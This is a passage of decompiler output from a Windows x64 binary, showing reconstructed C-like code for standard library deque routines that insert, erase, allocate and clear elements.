        v75 = (_DWORD *)(*(_QWORD *)(*(_QWORD *)(v74 + 8)
                                   + 8 * ((((unsigned __int64)v72 + j + v8) >> 2) & (*(_QWORD *)(v74 + 16) - 1i64)))
                       + 4i64 * (((_DWORD)v8 + (_DWORD)v72 + (_DWORD)j) & 3));
        if ( (((_BYTE)v72 + (_BYTE)v9) & 3) == 0 && (unsigned __int64)a1[2] <= ((unsigned __int64)v9 + 4) >> 2 )
          sub_13F13D020(a1, 1ui64);
        a1[3] = (__int64 *****)((4i64 * (_QWORD)a1[2] - 1) & (unsigned __int64)a1[3]);
        v76 = (unsigned __int64)a1[3] + (_QWORD)a1[4];
        v77 = (v76 >> 2) & ((unsigned __int64)a1[2] - 1);
        v78 = a1[1];
        if ( !v78[v77] )
        {
          a1[1][v77] = (__int64 ****)sub_13F14059C(16i64);
          v78 = a1[1];
        }
        *((_DWORD *)v78[v77] + (v76 & 3)) = *v75;
        a1[4] = (__int64 *****)((char *)a1[4] + 1);
        v9 = a1[4];
        v8 = v114;
      }
      if ( v70 )
      {
        v80 = *v70;
        if ( v80 )
          v71 = *v80;
      }
      v79 = a1[3];
      v81 = 0i64;
      if ( v71 && *v71 )
        v81 = **v71;
      v82 = v109;
      if ( v109 != v81 && *v81 )
        v82 = *(__int64 **)*v81;
      if ( v82 && *v82 )
        v7 = *(_QWORD ***)*v82;
      v110 = 0i64;
      if ( v7 && *v7 )
        *(_QWORD *)&v110 = **v7;
      v111 = (char *)v79 + v8 + v108;
      v106 = 0i64;
      if ( v82 && *v82 )
        *(_QWORD *)&v106 = *(_QWORD *)*v82;
      v107 = (char *)v79 + v8;
      v83 = v116;
    }
    return (__int64 *)sub_13F13BF20((__int64)&v106, (__int64)&v110, v83);
  }
  else
  {
    v11 = a3;
    if ( v8 >= a3 )
    {
      while ( 1 )
      {
        v38 = *a1;
        v39 = 0i64;
        if ( !v11 )
          break;
        v40 = a1[3];
        if ( v38 && *v38 )
          v39 = **v38;
        v41 = 0i64;
        if ( v39 && *v39 )
          v41 = **v39;
        v42 = 0i64;
        if ( v41 )
          v42 = *v41;
        v43 = (_DWORD *)(*(_QWORD *)(*(_QWORD *)(v42 + 8)
                                   + 8 * ((((unsigned __int64)v40 + v5 - 1) >> 2) & (*(_QWORD *)(v42 + 16) - 1i64)))
                       + 4i64 * (((_DWORD)v40 + (_DWORD)v5 - 1) & 3));
        if ( ((unsigned __int8)v40 & 3) == 0 && (unsigned __int64)a1[2] <= ((unsigned __int64)v9 + 4) >> 2 )
          sub_13F13D020(a1, 1ui64);
        v44 = 4i64 * (_QWORD)a1[2] - 1;
        v14 = (v44 & (unsigned __int64)a1[3]) == 0;
        a1[3] = (__int64 *****)(v44 & (unsigned __int64)a1[3]);
        v45 = a1[3];
        v46 = a1[2];
        if ( v14 )
          v45 = (__int64 *****)(4i64 * (_QWORD)v46);
        v47 = (__int64 *****)((char *)v45 - 1);
        v48 = ((unsigned __int64)v46 - 1) & ((unsigned __int64)v47 >> 2);
        v49 = a1[1];
        if ( !v49[v48] )
        {
          a1[1][v48] = (__int64 ****)sub_13F14059C(16i64);
          v49 = a1[1];
        }
        *((_DWORD *)v49[v48] + ((unsigned __int8)v47 & 3)) = *v43;
        a1[3] = v47;
        a1[4] = (__int64 *****)((char *)a1[4] + 1);
        v9 = a1[4];
        --v11;
      }
      if ( v38 && *v38 )
        v39 = **v38;
      v50 = a1[3];
      v51 = (char *)v50 + v5;
      v52 = 0i64;
      if ( v39 && *v39 )
        v52 = **v39;
      v53 = v109;
      if ( v109 != v52 && *v52 )
        v53 = *(__int64 **)*v52;
      v54 = *v116;
      v106 = 0i64;
      if ( v53 && *v53 )
        *(_QWORD *)&v106 = *(_QWORD *)*v53;
      v107 = (char *)v50 + v5;
      v55 = 0i64;
      if ( v53 && *v53 )
        v55 = *(_QWORD ***)*v53;
      v56 = v114;
      v57 = (__int64 *****)&v51[v114];
      v104 = 0i64;
      if ( v55 )
      {
        v58 = *v55;
        if ( v58 )
          *(_QWORD *)&v104 = *v58;
      }
      v105 = &v51[v114];
      v59 = 0i64;
      if ( v53 && *v53 )
        v59 = *(_QWORD ***)*v53;
      v110 = 0i64;
      if ( v59 )
      {
        v60 = *v59;
        if ( v60 )
          *(_QWORD *)&v110 = *v60;
      }
      v111 = &v51[v5];
      sub_13F13C020(v113, (__int64)&v110, (__int64)&v104, (__int64)&v106);
      v62 = 0i64;
      if ( *a1 )
      {
        v63 = **a1;
        if ( v63 )
          v62 = *v63;
      }
      v61 = a1[3];
      result = 0i64;
      if ( v62 && *v62 )
        result = **v62;
      if ( result )
        v7 = (_QWORD **)*result;
      *(_QWORD *)&v104 = v7;
      *((_QWORD *)&v104 + 1) = (char *)v61 + v56;
      if ( (__int64 *****)((char *)v61 + v56) != v57 )
      {
        v64 = (__int64 *****)*((_QWORD *)&v104 + 1);
        do
        {
          result = v7[1];
          *(_DWORD *)(result[((unsigned __int64)v7[2] - 1) & ((unsigned __int64)v64 >> 2)]
                    + 4i64 * ((unsigned __int8)v64 & 3)) = v54;
          v64 = (__int64 *****)((char *)v64 + 1);
        }
        while ( v64 != v57 );
      }
    }
    else
    {
      for ( k = a3 - v8; k; --k )
      {
        if ( ((_BYTE)a1[3] & 3) == 0 && (unsigned __int64)a1[2] <= ((unsigned __int64)v9 + 4) >> 2 )
          sub_13F13D020(a1, 1ui64);
        v13 = 4i64 * (_QWORD)a1[2] - 1;
        v14 = (v13 & (unsigned __int64)a1[3]) == 0;
        a1[3] = (__int64 *****)(v13 & (unsigned __int64)a1[3]);
        v15 = a1[3];
        v16 = a1[2];
        if ( v14 )
          v15 = (__int64 *****)(4i64 * (_QWORD)v16);
        v17 = (__int64 *****)((char *)v15 - 1);
        v18 = ((unsigned __int64)v17 >> 2) & ((unsigned __int64)v16 - 1);
        v19 = a1[1];
        if ( !v19[v18] )
        {
          a1[1][v18] = (__int64 ****)sub_13F14059C(16i64);
          v19 = a1[1];
        }
        *((_DWORD *)v19[v18] + ((unsigned __int8)v17 & 3)) = *v116;
        a1[3] = v17;
        a1[4] = (__int64 *****)((char *)a1[4] + 1);
        v9 = a1[4];
      }
      for ( m = v8; ; --m )
      {
        v21 = *a1;
        v22 = 0i64;
        if ( !m )
          break;
        v23 = a1[3];
        if ( v21 && *v21 )
          v22 = **v21;
        v24 = 0i64;
        if ( v22 && *v22 )
          v24 = **v22;
        v25 = 0i64;
        if ( v24 )
          v25 = *v24;
        v26 = (_DWORD *)(*(_QWORD *)(*(_QWORD *)(v25 + 8)
                                   + 8 * ((((unsigned __int64)v23 + v5 - 1) >> 2) & (*(_QWORD *)(v25 + 16) - 1i64)))
                       + 4i64 * (((_DWORD)v23 + (_DWORD)v5 - 1) & 3));
        if ( ((unsigned __int8)v23 & 3) == 0 && (unsigned __int64)a1[2] <= ((unsigned __int64)v9 + 4) >> 2 )
          sub_13F13D020(a1, 1ui64);
        v27 = 4i64 * (_QWORD)a1[2] - 1;
        v14 = (v27 & (unsigned __int64)a1[3]) == 0;
        a1[3] = (__int64 *****)(v27 & (unsigned __int64)a1[3]);
        v28 = a1[3];
        v29 = a1[2];
        if ( v14 )
          v28 = (__int64 *****)(4i64 * (_QWORD)v29);
        v30 = (__int64 *****)((char *)v28 - 1);
        v31 = ((unsigned __int64)v29 - 1) & ((unsigned __int64)v30 >> 2);
        v32 = a1[1];
        if ( !v32[v31] )
        {
          a1[1][v31] = (__int64 ****)sub_13F14059C(16i64);
          v32 = a1[1];
        }
        *((_DWORD *)v32[v31] + ((unsigned __int8)v30 & 3)) = *v26;
        a1[3] = v30;
        a1[4] = (__int64 *****)((char *)a1[4] + 1);
        v9 = a1[4];
      }
      if ( v21 )
      {
        v34 = *v21;
        if ( v34 )
          v22 = *v34;
      }
      v33 = a1[3];
      v35 = 0i64;
      if ( v22 && *v22 )
        v35 = **v22;
      v36 = v109;
      if ( v109 != v35 && *v35 )
        v36 = *(__int64 **)*v35;
      if ( v36 && *v36 )
        v7 = *(_QWORD ***)*v36;
      v104 = 0i64;
      if ( v7 && *v7 )
        *(_QWORD *)&v104 = **v7;
      v105 = (char *)v33 + v5 + v114;
      v106 = 0i64;
      if ( v36 && *v36 )
        *(_QWORD *)&v106 = *(_QWORD *)*v36;
      v107 = (char *)v33 + v5;
      return (__int64 *)sub_13F13BF20((__int64)&v106, (__int64)&v104, v116);
    }
  }
  return result;
}
// 13F13D3E0: using guessed type _QWORD var_60[12];

//----- (000000013F13DEA0) ----------------------------------------------------
__int64 *__fastcall sub_13F13DEA0(__int64 ******a1, __int64 a2, unsigned __int64 a3, __int64 *a4)
{
  unsigned __int64 v5; // r13
  _QWORD **v7; // rdi
  unsigned __int64 v8; // r12
  __int64 *****v9; // rsi
  char *v10; // r11
  unsigned __int64 v11; // r15
  unsigned __int64 k; // r15
  __int64 v13; // rax
  bool v14; // zf
  __int64 *****v15; // rsi
  __int64 *****v16; // rcx
  __int64 *****v17; // rsi
  unsigned __int64 v18; // r14
  __int64 *****v19; // rcx
  unsigned __int64 m; // r15
  __int64 *****v21; // rax
  __int64 ***v22; // rcx
  __int64 *****v23; // r9
  __int64 *v24; // rax
  __int64 v25; // rdx
  __int64 ****v26; // r12
  __int64 v27; // rax
  __int64 *****v28; // rsi
  __int64 *****v29; // rax
  __int64 *****v30; // rsi
  unsigned __int64 v31; // r14
  __int64 *****v32; // rcx
  __int64 *****v33; // rdx
  __int64 ****v34; // rax
  __int64 *v35; // rax
  _QWORD **v36; // r9
  __int64 *result; // rax
  __int64 *****v38; // rax
  __int64 ***v39; // rcx
  __int64 *****v40; // r9
  __int64 *v41; // rax
  __int64 v42; // rdx
  __int64 ****v43; // r12
  __int64 v44; // rax
  __int64 *****v45; // rsi
  __int64 *****v46; // rax
  __int64 *****v47; // rsi
  unsigned __int64 v48; // r14
  __int64 *****v49; // rcx
  __int64 *****v50; // r8
  char *v51; // rdx
  __int64 *v52; // rax
  _QWORD **v53; // r9
  __int64 v54; // r14
  _QWORD **v55; // rax
  __int64 v56; // r12
  __int64 *****v57; // rsi
  _QWORD *v58; // rax
  _QWORD **v59; // rax
  _QWORD *v60; // rax
  __int64 *****v61; // rdx
  __int64 ***v62; // rcx
  __int64 ****v63; // rax
  __int64 *****v64; // r8
  unsigned __int64 i; // r13
  unsigned __int64 v66; // rsi
  unsigned __int64 v67; // r14
  __int64 *****v68; // rcx
  unsigned __int64 j; // r15
  __int64 *****v70; // rax
  __int64 ***v71; // rcx
  __int64 *****v72; // r9
  __int64 *v73; // rax
  __int64 v74; // rdx
  __int64 ****v75; // r12
  unsigned __int64 v76; // rsi
  unsigned __int64 v77; // r14
  __int64 *****v78; // rcx
  __int64 *****v79; // rdx
  __int64 ****v80; // rax
  __int64 *v81; // rax
  _QWORD **v82; // r9
  __int64 *v83; // r8
  unsigned __int64 v84; // r12
  __int64 *****v85; // r10
  __int64 *****v86; // rax
  __int64 ***v87; // rcx
  __int64 *****v88; // r9
  __int64 *v89; // rax
  __int64 v90; // r8
  __int64 ****v91; // r13
  unsigned __int64 v92; // r14
  unsigned __int64 v93; // r15
  __int64 *****v94; // rcx
  __int64 ****v95; // rax
  char *v96; // rbx
  __int64 *v97; // rax
  _QWORD **v98; // r9
  _QWORD ***v99; // rcx
  _QWORD **v100; // rax
  _QWORD *v101; // rax
  _QWORD **v102; // rax
  _QWORD *v103; // rax
  __int128 v104; // [rsp+38h] [rbp-C8h] BYREF
  char *v105; // [rsp+48h] [rbp-B8h]
  __int128 v106; // [rsp+58h] [rbp-A8h] BYREF
  char *v107; // [rsp+68h] [rbp-98h]
  unsigned __int64 v108; // [rsp+70h] [rbp-90h] BYREF
  __int128 v109; // [rsp+78h] [rbp-88h] BYREF
  char *v110; // [rsp+88h] [rbp-78h]
  unsigned __int64 v111; // [rsp+90h] [rbp-70h]
  __int64 *****v112; // [rsp+98h] [rbp-68h]
  _QWORD v113[12]; // [rsp+A0h] [rbp-60h] BYREF
  _QWORD **v114; // [rsp+110h] [rbp+10h]

  v113[3] = -2i64;
  v5 = a3;
  v7 = 0i64;
  v114 = 0i64;
  v8 = *(_QWORD *)(a2 + 16) - (_QWORD)a1[3];
  v108 = v8;
  v9 = a1[4];
  v112 = v9;
  v10 = (char *)v9 - v8;
  v111 = (unsigned __int64)v9 - v8;
  if ( v8 >= (unsigned __int64)v9 - v8 )
  {
    if ( (unsigned __int64)v10 >= a3 )
    {
      v84 = 0i64;
      v85 = v9;
      while ( 1 )
      {
        v86 = *a1;
        v87 = 0i64;
        if ( v84 >= v5 )
          break;
        v88 = a1[3];
        if ( v86 && *v86 )
          v87 = **v86;
        v89 = 0i64;
        if ( v87 && *v87 )
          v89 = **v87;
        v90 = 0i64;
        if ( v89 )
          v90 = *v89;
        v91 = (__int64 ****)(*(_QWORD *)(*(_QWORD *)(v90 + 8)
                                       + 8
                                       * ((((unsigned __int64)v88 + (_QWORD)v9 - v5 + v84) >> 1) & (*(_QWORD *)(v90 + 16)
                                                                                                  - 1i64)))
                           + 8i64 * (((_DWORD)v84 + (_DWORD)v9 + (_DWORD)v88 - (_DWORD)v5) & 1));
        if ( (((_BYTE)v88 + (_BYTE)v85) & 1) == 0 && (unsigned __int64)a1[2] <= ((unsigned __int64)v85 + 2) >> 1 )
          sub_13F13D200(a1, 1ui64);
        a1[3] = (__int64 *****)((2i64 * (_QWORD)a1[2] - 1) & (unsigned __int64)a1[3]);
        v92 = (unsigned __int64)a1[3] + (_QWORD)a1[4];
        v93 = (v92 >> 1) & ((unsigned __int64)a1[2] - 1);
        v94 = a1[1];
        if ( !v94[v93] )
        {
          a1[1][v93] = (__int64 ****)sub_13F13EA10((__int64)a1, 2ui64);
          v94 = a1[1];
        }
        v94[v93][v92 & 1] = *v91;
        a1[4] = (__int64 *****)((char *)a1[4] + 1);
        v85 = a1[4];
        ++v84;
        v5 = a3;
      }
      if ( v86 )
      {
        v95 = *v86;
        if ( v95 )
          v87 = *v95;
      }
      v96 = (char *)a1[3] + v108;
      v97 = 0i64;
      if ( v87 && *v87 )
        v97 = **v87;
      v98 = 0i64;
      if ( v97 )
      {
        v99 = (_QWORD ***)*v97;
        if ( *v97 )
        {
          v98 = *v99;
          v114 = *v99;
        }
      }
      v108 = *a4;
      v100 = 0i64;
      if ( v98 && *v98 )
        v100 = (_QWORD **)**v98;
      v109 = 0i64;
      if ( v100 )
      {
        v101 = *v100;
        if ( v101 )
          *(_QWORD *)&v109 = *v101;
      }
      v110 = &v96[v111];
      v102 = 0i64;
      if ( v98 && *v98 )
        v102 = (_QWORD **)**v98;
      v106 = 0i64;
      if ( v102 )
      {
        v103 = *v102;
        if ( v103 )
          *(_QWORD *)&v106 = *v103;
      }
      v107 = &v96[v111 - v5];
      v104 = 0i64;
      if ( v98 && *v98 )
        *(_QWORD *)&v104 = **v98;
      v105 = v96;
      sub_13F13C380(v113, (__int64)&v104, (__int64)&v106, (__int64)&v109);
      if ( v114 && *v114 )
        v7 = (_QWORD **)**v114;
      v109 = 0i64;
      if ( v7 && *v7 )
        *(_QWORD *)&v109 = **v7;
      v110 = &v96[v5];
      v106 = 0i64;
      if ( v114 && *v114 )
        *(_QWORD *)&v106 = **v114;
      v107 = v96;
      v83 = (__int64 *)&v108;
    }
    else
    {
      for ( i = a3 - (_QWORD)v10; i; --i )
      {
        if ( ((*((_BYTE *)a1 + 24) + (_BYTE)v9) & 1) == 0 && (unsigned __int64)a1[2] <= ((unsigned __int64)v9 + 2) >> 1 )
          sub_13F13D200(a1, 1ui64);
        a1[3] = (__int64 *****)((2i64 * (_QWORD)a1[2] - 1) & (unsigned __int64)a1[3]);
        v66 = (unsigned __int64)a1[3] + (_QWORD)a1[4];
        v67 = (v66 >> 1) & ((unsigned __int64)a1[2] - 1);
        v68 = a1[1];
        if ( !v68[v67] )
        {
          a1[1][v67] = (__int64 ****)sub_13F14059C(16i64);
          v68 = a1[1];
        }
        v68[v67][v66 & 1] = (__int64 ***)*a4;
        a1[4] = (__int64 *****)((char *)a1[4] + 1);
        v9 = a1[4];
      }
      for ( j = 0i64; ; ++j )
      {
        v70 = *a1;
        v71 = 0i64;
        if ( j >= v111 )
          break;
        v72 = a1[3];
        if ( v70 && *v70 )
          v71 = **v70;
        v73 = 0i64;
        if ( v71 && *v71 )
          v73 = **v71;
        v74 = 0i64;
        if ( v73 )
          v74 = *v73;
        v75 = (__int64 ****)(*(_QWORD *)(*(_QWORD *)(v74 + 8)
                                       + 8 * ((((unsigned __int64)v72 + j + v8) >> 1) & (*(_QWORD *)(v74 + 16) - 1i64)))
                           + 8i64 * (((_DWORD)v8 + (_DWORD)v72 + (_DWORD)j) & 1));
        if ( (((_BYTE)v72 + (_BYTE)v9) & 1) == 0 && (unsigned __int64)a1[2] <= ((unsigned __int64)v9 + 2) >> 1 )
          sub_13F13D200(a1, 1ui64);
        a1[3] = (__int64 *****)((2i64 * (_QWORD)a1[2] - 1) & (unsigned __int64)a1[3]);
        v76 = (unsigned __int64)a1[3] + (_QWORD)a1[4];
        v77 = (v76 >> 1) & ((unsigned __int64)a1[2] - 1);
        v78 = a1[1];
        if ( !v78[v77] )
        {
          a1[1][v77] = (__int64 ****)sub_13F14059C(16i64);
          v78 = a1[1];
        }
        v78[v77][v76 & 1] = *v75;
        a1[4] = (__int64 *****)((char *)a1[4] + 1);
        v9 = a1[4];
        v8 = v108;
      }
      if ( v70 )
      {
        v80 = *v70;
        if ( v80 )
          v71 = *v80;
      }
      v79 = a1[3];
      v81 = 0i64;
      if ( v71 && *v71 )
        v81 = **v71;
      v82 = 0i64;
      if ( v81 && *v81 )
        v82 = *(_QWORD ***)*v81;
      if ( v82 && *v82 )
        v7 = (_QWORD **)**v82;
      v109 = 0i64;
      if ( v7 && *v7 )
        *(_QWORD *)&v109 = **v7;
      v110 = (char *)v79 + v8 + v111;
      v106 = 0i64;
      if ( v82 && *v82 )
        *(_QWORD *)&v106 = **v82;
      v107 = (char *)v79 + v8;
      v83 = a4;
    }
    return (__int64 *)sub_13F13BFA0((__int64)&v106, (__int64)&v109, v83);
  }
  else
  {
    v11 = a3;
    if ( v8 >= a3 )
    {
      while ( 1 )
      {
        v38 = *a1;
        v39 = 0i64;
        if ( !v11 )
          break;
        v40 = a1[3];
        if ( v38 && *v38 )
          v39 = **v38;
        v41 = 0i64;
        if ( v39 && *v39 )
          v41 = **v39;
        v42 = 0i64;
        if ( v41 )
          v42 = *v41;
        v43 = (__int64 ****)(*(_QWORD *)(*(_QWORD *)(v42 + 8)
                                       + 8 * ((((unsigned __int64)v40 + v5 - 1) >> 1) & (*(_QWORD *)(v42 + 16) - 1i64)))
                           + 8i64 * (((_DWORD)v40 + (_DWORD)v5 - 1) & 1));
        if ( ((unsigned __int8)v40 & 1) == 0 && (unsigned __int64)a1[2] <= ((unsigned __int64)v9 + 2) >> 1 )
          sub_13F13D200(a1, 1ui64);
        v44 = 2i64 * (_QWORD)a1[2] - 1;
        v14 = (v44 & (unsigned __int64)a1[3]) == 0;
        a1[3] = (__int64 *****)(v44 & (unsigned __int64)a1[3]);
        v45 = a1[3];
        v46 = a1[2];
        if ( v14 )
          v45 = (__int64 *****)(2i64 * (_QWORD)v46);
        v47 = (__int64 *****)((char *)v45 - 1);
        v48 = ((unsigned __int64)v46 - 1) & ((unsigned __int64)v47 >> 1);
        v49 = a1[1];
        if ( !v49[v48] )
        {
          a1[1][v48] = (__int64 ****)sub_13F14059C(16i64);
          v49 = a1[1];
        }
        v49[v48][(unsigned __int8)v47 & 1] = *v43;
        a1[3] = v47;
        a1[4] = (__int64 *****)((char *)a1[4] + 1);
        v9 = a1[4];
        --v11;
      }
      if ( v38 && *v38 )
        v39 = **v38;
      v50 = a1[3];
      v51 = (char *)v50 + v5;
      v52 = 0i64;
      if ( v39 && *v39 )
        v52 = **v39;
      v53 = 0i64;
      if ( v52 && *v52 )
        v53 = *(_QWORD ***)*v52;
      v54 = *a4;
      v106 = 0i64;
      if ( v53 && *v53 )
        *(_QWORD *)&v106 = **v53;
      v107 = (char *)v50 + v5;
      v55 = 0i64;
      if ( v53 && *v53 )
        v55 = (_QWORD **)**v53;
      v56 = v108;
      v57 = (__int64 *****)&v51[v108];
      v104 = 0i64;
      if ( v55 )
      {
        v58 = *v55;
        if ( v58 )
          *(_QWORD *)&v104 = *v58;
      }
      v105 = &v51[v108];
      v59 = 0i64;
      if ( v53 && *v53 )
        v59 = (_QWORD **)**v53;
      v109 = 0i64;
      if ( v59 )
      {
        v60 = *v59;
        if ( v60 )
          *(_QWORD *)&v109 = *v60;
      }
      v110 = &v51[v5];
      sub_13F13C130(v113, (__int64)&v109, (__int64)&v104, (__int64)&v106);
      v62 = 0i64;
      if ( *a1 )
      {
        v63 = **a1;
        if ( v63 )
          v62 = *v63;
      }
      v61 = a1[3];
      result = 0i64;
      if ( v62 && *v62 )
        result = **v62;
      if ( result )
        v7 = (_QWORD **)*result;
      *(_QWORD *)&v104 = v7;
      *((_QWORD *)&v104 + 1) = (char *)v61 + v56;
      if ( (__int64 *****)((char *)v61 + v56) != v57 )
      {
        v64 = (__int64 *****)*((_QWORD *)&v104 + 1);
        do
        {
          result = v7[1];
          *(_QWORD *)(result[((unsigned __int64)v7[2] - 1) & ((unsigned __int64)v64 >> 1)]
                    + 8i64 * ((unsigned __int8)v64 & 1)) = v54;
          v64 = (__int64 *****)((char *)v64 + 1);
        }
        while ( v64 != v57 );
      }
    }
    else
    {
      for ( k = a3 - v8; k; --k )
      {
        if ( ((_BYTE)a1[3] & 1) == 0 && (unsigned __int64)a1[2] <= ((unsigned __int64)v9 + 2) >> 1 )
          sub_13F13D200(a1, 1ui64);
        v13 = 2i64 * (_QWORD)a1[2] - 1;
        v14 = (v13 & (unsigned __int64)a1[3]) == 0;
        a1[3] = (__int64 *****)(v13 & (unsigned __int64)a1[3]);
        v15 = a1[3];
        v16 = a1[2];
        if ( v14 )
          v15 = (__int64 *****)(2i64 * (_QWORD)v16);
        v17 = (__int64 *****)((char *)v15 - 1);
        v18 = ((unsigned __int64)v17 >> 1) & ((unsigned __int64)v16 - 1);
        v19 = a1[1];
        if ( !v19[v18] )
        {
          a1[1][v18] = (__int64 ****)sub_13F14059C(16i64);
          v19 = a1[1];
        }
        v19[v18][(unsigned __int8)v17 & 1] = (__int64 ***)*a4;
        a1[3] = v17;
        a1[4] = (__int64 *****)((char *)a1[4] + 1);
        v9 = a1[4];
      }
      for ( m = v8; ; --m )
      {
        v21 = *a1;
        v22 = 0i64;
        if ( !m )
          break;
        v23 = a1[3];
        if ( v21 && *v21 )
          v22 = **v21;
        v24 = 0i64;
        if ( v22 && *v22 )
          v24 = **v22;
        v25 = 0i64;
        if ( v24 )
          v25 = *v24;
        v26 = (__int64 ****)(*(_QWORD *)(*(_QWORD *)(v25 + 8)
                                       + 8 * ((((unsigned __int64)v23 + v5 - 1) >> 1) & (*(_QWORD *)(v25 + 16) - 1i64)))
                           + 8i64 * (((_DWORD)v23 + (_DWORD)v5 - 1) & 1));
        if ( ((unsigned __int8)v23 & 1) == 0 && (unsigned __int64)a1[2] <= ((unsigned __int64)v9 + 2) >> 1 )
          sub_13F13D200(a1, 1ui64);
        v27 = 2i64 * (_QWORD)a1[2] - 1;
        v14 = (v27 & (unsigned __int64)a1[3]) == 0;
        a1[3] = (__int64 *****)(v27 & (unsigned __int64)a1[3]);
        v28 = a1[3];
        v29 = a1[2];
        if ( v14 )
          v28 = (__int64 *****)(2i64 * (_QWORD)v29);
        v30 = (__int64 *****)((char *)v28 - 1);
        v31 = ((unsigned __int64)v29 - 1) & ((unsigned __int64)v30 >> 1);
        v32 = a1[1];
        if ( !v32[v31] )
        {
          a1[1][v31] = (__int64 ****)sub_13F14059C(16i64);
          v32 = a1[1];
        }
        v32[v31][(unsigned __int8)v30 & 1] = *v26;
        a1[3] = v30;
        a1[4] = (__int64 *****)((char *)a1[4] + 1);
        v9 = a1[4];
      }
      if ( v21 )
      {
        v34 = *v21;
        if ( v34 )
          v22 = *v34;
      }
      v33 = a1[3];
      v35 = 0i64;
      if ( v22 && *v22 )
        v35 = **v22;
      v36 = 0i64;
      if ( v35 && *v35 )
        v36 = *(_QWORD ***)*v35;
      if ( v36 && *v36 )
        v7 = (_QWORD **)**v36;
      v104 = 0i64;
      if ( v7 && *v7 )
        *(_QWORD *)&v104 = **v7;
      v105 = (char *)v33 + v5 + v108;
      v106 = 0i64;
      if ( v36 && *v36 )
        *(_QWORD *)&v106 = **v36;
      v107 = (char *)v33 + v5;
      return (__int64 *)sub_13F13BFA0((__int64)&v106, (__int64)&v104, a4);
    }
  }
  return result;
}
// 13F13DEA0: using guessed type _QWORD var_60[12];

//----- (000000013F13E930) ----------------------------------------------------
__int64 __fastcall sub_13F13E930(_QWORD *a1)
{
  __int64 result; // rax
  __int64 v3; // rdi
  __int64 v4; // rcx
  __int64 v5; // rcx
  unsigned __int64 v6; // rdx

  result = a1[4];
  while ( result )
  {
    a1[4] = --result;
    if ( !result )
      a1[3] = 0i64;
  }
  v3 = a1[2];
  while ( v3 )
  {
    result = a1[1];
    --v3;
    v4 = *(_QWORD *)(result + 8 * v3);
    if ( v4 )
      result = sub_13F14088C(v4, 16i64);
  }
  v5 = a1[1];
  if ( v5 )
  {
    v6 = 8i64 * a1[2];
    if ( v6 >= 0x1000 )
    {
      v6 += 39i64;
      if ( (unsigned __int64)(v5 - *(_QWORD *)(v5 - 8) - 8) > 0x1F )
        sub_13F1682C0();
      v5 = *(_QWORD *)(v5 - 8);
    }
    result = sub_13F14088C(v5, v6);
  }
  a1[2] = 0i64;
  a1[1] = 0i64;
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F13E9F0) ----------------------------------------------------
void __noreturn sub_13F13E9F0()
{
  sub_13F10998C((__int64)"deque<T> too long");
}

//----- (000000013F13EA10) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F13EA10(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 result; // rax
  __int64 v3; // rcx
  __int64 v4; // rax
  __int64 v5; // rcx

  result = 8 * a2;
  if ( a2 > 0x1FFFFFFFFFFFFFFFi64 )
  {
    result = -1i64;
LABEL_4:
    v3 = result + 39;
    if ( result + 39 <= result )
      v3 = -1i64;
    v4 = sub_13F14059C(v3);
    v5 = v4;
    if ( !v4 )
      sub_13F1682C0();
    result = (v4 + 39) & 0xFFFFFFFFFFFFFFE0ui64;
    *(_QWORD *)(result - 8) = v5;
    return result;
  }
  if ( result >= 0x1000 )
    goto LABEL_4;
  if ( result )
    return sub_13F14059C(8 * a2);
  return result;
}

//----- (000000013F13EA90) ----------------------------------------------------
_QWORD *__fastcall sub_13F13EA90(unsigned __int64 *a1, _QWORD *a2, __int64 a3, __int64 a4)
{
  __int64 v4; // r10
  _QWORD **v7; // rdx
  __int64 v8; // r8
  _QWORD **v9; // rcx
  unsigned __int64 v10; // r11
  __int64 v11; // r9
  unsigned __int64 v12; // r14
  __int64 v13; // rdi
  bool v14; // zf
  _QWORD **v15; // rax
  unsigned __int64 v16; // rdx
  _QWORD ***v17; // rcx
  _QWORD *v18; // rax
  __int128 v20; // [rsp+20h] [rbp-60h] BYREF
  __int64 v21; // [rsp+30h] [rbp-50h]
  __int128 v22; // [rsp+38h] [rbp-48h] BYREF
  __int64 v23; // [rsp+48h] [rbp-38h]
  __int128 v24; // [rsp+50h] [rbp-30h] BYREF
  unsigned __int64 v25; // [rsp+60h] [rbp-20h]
  __int64 v26[3]; // [rsp+68h] [rbp-18h] BYREF

  v4 = *(_QWORD *)(a3 + 16);
  v7 = 0i64;
  if ( a1 )
    v7 = (_QWORD **)*a1;
  v8 = *(_QWORD *)(a4 + 16);
  v9 = 0i64;
  if ( a1 )
    v9 = (_QWORD **)*a1;
  v10 = a1[3];
  v11 = v10 + a1[4];
  v12 = v4 - v10;
  v13 = v8 - v4;
  if ( v4 - v10 >= v11 - v8 )
  {
    v24 = 0i64;
    if ( v7 && *v7 )
      *(_QWORD *)&v24 = **v7;
    v22 = *a1;
    v25 = v4;
    v23 = v11;
    v20 = 0i64;
    if ( v9 && *v9 )
      *(_QWORD *)&v20 = **v9;
    v21 = v8;
    sub_13F13C020(v26, (__int64)&v20, (__int64)&v22, (__int64)&v24);
    for ( ; v13; --v13 )
    {
      v14 = a1[4]-- == 1;
      if ( v14 )
        a1[3] = 0i64;
    }
  }
  else
  {
    v20 = 0i64;
    if ( v9 && *v9 )
      *(_QWORD *)&v20 = **v9;
    v21 = v8;
    v22 = 0i64;
    if ( v7 && *v7 )
      *(_QWORD *)&v22 = **v7;
    v24 = *a1;
    v23 = v4;
    v25 = v10;
    sub_13F13C240(v26, (__int64)&v24, (__int64)&v22, (__int64)&v20);
    for ( ; v13; --v13 )
    {
      v14 = a1[4]-- == 1;
      if ( v14 )
        a1[3] = 0i64;
      else
        ++a1[3];
    }
  }
  v15 = 0i64;
  v16 = a1[3];
  if ( *a1 )
  {
    v17 = *(_QWORD ****)*a1;
    if ( v17 )
      v15 = *v17;
  }
  *a2 = 0i64;
  a2[2] = v16 + v12;
  a2[1] = 0i64;
  if ( v15 )
  {
    v18 = *v15;
    if ( v18 )
      *a2 = *v18;
  }
  return a2;
}
// 13F13EA90: using guessed type _QWORD var_18[3];

//----- (000000013F13EC50) ----------------------------------------------------
_QWORD *__fastcall sub_13F13EC50(unsigned __int64 *a1, _QWORD *a2, __int64 a3, __int64 a4)
{
  __int64 v4; // r10
  _QWORD **v7; // rdx
  __int64 v8; // r8
  _QWORD **v9; // rcx
  unsigned __int64 v10; // r11
  __int64 v11; // r9
  unsigned __int64 v12; // r14
  __int64 v13; // rdi
  bool v14; // zf
  _QWORD **v15; // rax
